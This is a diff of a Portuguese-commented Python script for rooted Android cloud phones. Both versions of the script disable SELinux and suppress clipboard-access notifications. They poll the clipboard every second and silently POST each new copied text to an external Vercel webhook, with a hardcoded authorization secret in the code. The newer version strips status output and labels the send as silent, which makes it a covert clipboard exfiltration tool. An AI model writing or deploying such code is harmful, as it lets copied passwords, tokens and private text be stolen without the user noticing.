@@ -2,98 +2,80 @@ import sys
 import time
 import subprocess
 import requests
-import os
+import re
 
-# --- CONFIGURAÇÕES ---
+# Configurações do seu ecossistema
 if len(sys.argv) < 3:
-    print("Uso: python script.py DEVICE_ID GUILD_ID")
     sys.exit(1)
 
-device_id = sys.argv[1]
-guild_id = sys.argv[2]
+DEVICE_ID = sys.argv[1]
+GUILD_ID = sys.argv[2]
 URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
-headers = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
+HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
 
-# --- FUNÇÕES DE BYPASS (ROOT) ---
-
-def apply_system_bypass():
-    """Força a abertura das travas de segurança do Android e do UgPhone"""
-    print("🔓 Aplicando Bypass de Sistema...")
-    cmds = [
-        # Permite leitura em background (Android 10+)
-        "device_config put device_config_inf_dest_clipboard_allow_background_read true",
-        # Dá permissão total ao Termux no sistema
-        "appops set com.termux SYSTEM_ALERT_WINDOW allow",
+def apply_aggressive_bypass():
+    """Tenta explodir todas as travas do UgPhone de uma vez"""
+    commands = [
+        "setenforce 0", # Desativa o SELinux
+        "settings put global settings_clipboard_show_access_notifications 0",
         "appops set com.termux READ_CLIPBOARD allow",
-        # Evita que o Android 'congele' o processo no fundo
-        "dumpsys deviceidle whitelist +com.termux",
-        # Tenta desativar restrições do SELinux (Modo Permissivo)
-        "setenforce 0"
+        "dumpsys deviceidle whitelist +com.termux"
     ]
-    for c in cmds:
-        subprocess.run(f"su -c '{c}'", shell=True, stderr=subprocess.DEVNULL)
+    for cmd in commands:
+        subprocess.run(f"su -c '{cmd}'", shell=True, stderr=subprocess.DEVNULL)
 
-def get_clip_low_level():
-    """Lê o clipboard direto do Service Manager (Bypassa o bloqueio de foco)"""
+def get_clip_via_dumpsys():
+    """Extrai o texto do clipboard direto do relatório de dump do sistema"""
     try:
-        # Tenta a chamada direta ao Binder (mais poderosa que a API comum)
-        # O awk limpa a saída hex para pegar apenas o texto entre aspas
-        cmd = "su -c 'service call clipboard 2 s16 com.android.shell | awk -F \"\\\"\" \"{print $2}\" | tr -d \"\\n\"'"
-        res = subprocess.check_output(cmd, shell=True).decode('utf-8').strip()
+        # O dumpsys clipboard cospe muita coisa. Usamos Regex para pegar apenas o conteúdo.
+        cmd = "su -c 'dumpsys clipboard'"
+        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
         
-        # Se o service call falhar ou vir vazio, tenta o comando de sistema secundário
-        if not res or "Result: Parcel" in res or res == "null":
-            res = subprocess.check_output("su -c 'cmd clipboard get-text'", shell=True).decode('utf-8').strip()
-        
-        return res
+        # Procura pelo padrão 'mText=conteúdo' ou 'text="conteúdo"' que o Android usa no dump
+        match = re.search(r'mText=(.*)', output)
+        if not match:
+            match = re.search(r'text="(.*)"', output)
+            
+        if match:
+            result = match.group(1).strip()
+            # Limpa resíduos de formatação do dump
+            return result.split('{')[0].strip() 
+        return ""
     except:
         return ""
 
-# --- LOOP PRINCIPAL (POLLING AGRESSIVO) ---
-
 def main():
-    apply_system_bypass()
+    print("🧨 Iniciando captura agressiva via Dumpsys...")
+    apply_aggressive_bypass()
     
-    last_clip = get_clip_low_level()
-    print(f"🚀 Monitoramento ativo no Dispositivo: {device_id}")
-    print("👀 Aguardando cópia no Google ou qualquer App...")
-
+    last_clip = get_clip_via_dumpsys()
+    
     while True:
         try:
-            # No UgPhone, não esperamos o sistema avisar (Logcat). 
-            # Nós perguntamos diretamente o que tem no clipboard.
-            current = get_clip_low_level()
-
+            current = get_clip_via_dumpsys()
+            
+            # Se o texto existe e é diferente do anterior
             if current and current != last_clip:
-                # Se o texto mudou, enviamos imediatamente
-                print(f"✨ Novo texto detectado: {current[:30]}...")
+                print(f"🔥 Peguei: {current[:40]}...")
                 
                 payload = {
                     "texto": current, 
-                    "device_id": device_id, 
-                    "guild_id": guild_id
+                    "device_id": DEVICE_ID, 
+                    "guild_id": GUILD_ID
                 }
                 
-                response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
-                
-                if response.status_code == 200:
-                    print("✅ Enviado com sucesso para o painel.")
-                else:
-                    print(f"❌ Erro no envio: {response.status_code}")
-                
+                # Envio silencioso
+                requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
                 last_clip = current
-
-            # Intervalo de 0.7s é o 'sweet spot' para não pesar o CPU e não perder o timing da cópia
-            time.sleep(0.7)
-
+            
+            # Polling rápido
+            time.sleep(1) 
+            
         except KeyboardInterrupt:
-            print("\n🛑 Encerrando...")
-            sys.exit(0)
-        except Exception as e:
-            # Silencia erros de rede ou sistema para o script não parar
+            break
+        except:
             time.sleep(2)
-            continue
 
 if __name__ == "__main__":
     main()
